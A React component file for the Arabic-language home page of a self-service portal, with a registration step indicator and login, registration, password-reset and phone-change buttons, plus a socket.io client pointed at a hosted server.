import React from "react";
import { useNavigate } from "react-router-dom";
import io from "socket.io-client";

// export const serverRoute = "http://localhost:8080";
export const serverRoute = "https://taw-se-production.up.railway.app";
export const socket = io(serverRoute);

const Home = () => {
  const navigate = useNavigate();

  const handleButtonClick = () => {
    sessionStorage.clear();
    navigate("/login");
  };

  return (
    <div className=" bg-gray-50 flex flex-col" dir="rtl">
      {/* Stepper Progress Bar */}
      <div className="w-full bg-white pt-4  px-4">
        <div className="max-w-4xl mx-auto">
          <div className="flex items-center justify-between relative flex-row-reverse w-full">
            {/* Step 4 */}
            <div className="flex flex-col items-center flex-1">
              <div className="relative flex items-center justify-center w-full">
                <div className="absolute left-0 right-1/2 h-0.5 border-t-2 border-dotted border-gray-300 -z-10"></div>
                <div className="w-10 h-10 rounded-full border-2 border-gray-300 bg-white flex items-center justify-center text-gray-400 font-bold z-10">
                  4
                </div>
              </div>
              <div className="text-center mt-3">
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  إنتهاء
                </p>
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  التسجيل
                </p>
              </div>
            </div>

            {/* Step 3 */}
            <div className="flex flex-col items-center flex-1">
              <div className="relative flex items-center justify-center w-full">
                <div className="absolute left-1/2 right-1/2 h-0.5 border-t-2 border-dotted border-gray-300 -z-10"></div>
                <div className="w-10 h-10 rounded-full border-2 border-gray-300 bg-white flex items-center justify-center text-gray-400 font-bold z-10">
                  3
                </div>
              </div>
              <div className="text-center mt-3">
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  كلمة
                </p>
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  المرور
                </p>
              </div>
            </div>

            {/* Step 2 */}
            <div className="flex flex-col items-center flex-1">
              <div className="relative flex items-center justify-center w-full">
                <div className="absolute left-1/2 right-1/2 h-0.5 border-t-2 border-dotted border-gray-300 -z-10"></div>
                <div className="w-10 h-10 rounded-full border-2 border-gray-300 bg-white flex items-center justify-center text-gray-400 font-bold z-10">
                  2
                </div>
              </div>
              <div className="text-center mt-3">
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  البيانات
                </p>
                <p className="text-xs md:text-base font-semibold text-gray-600">
                  الشخصية
                </p>
              </div>
            </div>

            {/* Step 1 - Active */}
            <div className="flex flex-col items-center flex-1">
              <div className="relative flex items-center justify-center w-full">
                <div className="absolute left-1/2 right-0 h-0.5 border-t-2 border-dotted border-gray-300 -z-10"></div>
                <div className="w-10 h-10 rounded-full bg-[#0071bc] flex items-center justify-center text-white font-bold z-10">
                  1
                </div>
              </div>
              <div className="text-center mt-3">
                <p className="text-xs md:text-base font-semibold text-gray-800">
                  نوع
                </p>
                <p className="text-xs md:text-base font-semibold text-gray-800">
                  الحساب
                </p>
              </div>
            </div>
            <div className="absolute h-0.5 top-5  w-full bg-gray-200"></div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 container mx-auto px-4 pb-4 md:py-16">
        <div className="max-w-3xl mx-auto bg-white rounded-lg shadow-lg p-2 md:p-12">
          {/* Title */}
          <div className="text-center mb-3">
            <div className="border-b border-gray-300 pb-4">
              <h2 className="text-lg md:text-3xl font-bold ">
                الصفحة الرئيسية لبوابة الخدمة الذاتية
              </h2>
            </div>
          </div>

          {/* First Section - Login */}
          <div className="mb-3">
            <p className="text-right  text-gray-700 mb-6 text-base pr-2">
              للوصول إلى بوابة الخدمة الذاتية، يجب النقر على رابط تسجيل الدخول.
            </p>
            <div className="flex justify-center">
              <button
                onClick={handleButtonClick}
                className="bg-[#3c96c4] hover:bg-[#2d7fa8] text-white font-bold py-4 px-12 rounded-lg text-base transition-colors w-2/3 md:w-auto"
              >
                تسجيل الدخول
              </button>
            </div>
          </div>

          {/* Second Section - Register */}
          <div className="mb-3">
            <p className="text-right  text-gray-700 mb-6 text-base pr-2">
              إذا لم يكن لديك حساب مستخدم، يرجى محاولة القيام بالإجراء الآتي:
            </p>
            <div className="flex justify-center">
              <button
                onClick={handleButtonClick}
                className="bg-[#3c96c4] hover:bg-[#2d7fa8] text-white font-bold py-4 px-2 rounded-lg text-base transition-colors w-2/3 md:w-auto"
              >
                تسجيل مستخدم جديد
              </button>
            </div>
          </div>

          {/* Third Section - Account Issues */}
          <div className="mb-3">
            <p className="text-right  text-gray-700 mb-6 text-base pr-2">
              إذا لم تتمكن من الدخول إلى حسابك، يرجى محاولة القيام بأحد
              الإجراءات التالية:
            </p>
            <div className="flex flex-col gap-4 items-center justify-center">
              <button
                onClick={handleButtonClick}
                className="bg-[#3c96c4] hover:bg-[#2d7fa8] text-white font-bold py-4 px-2 rounded-lg text-base transition-colors w-2/3 md:w-auto"
              >
                إعادة تعيين كلمة المرور
              </button>
              <button
                onClick={handleButtonClick}
                className="bg-[#3c96c4] hover:bg-[#2d7fa8] text-white font-bold py-4 px-2 rounded-lg text-base transition-colors w-2/3 md:w-auto"
              >
                تغيير رقم الجوال
              </button>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Home;
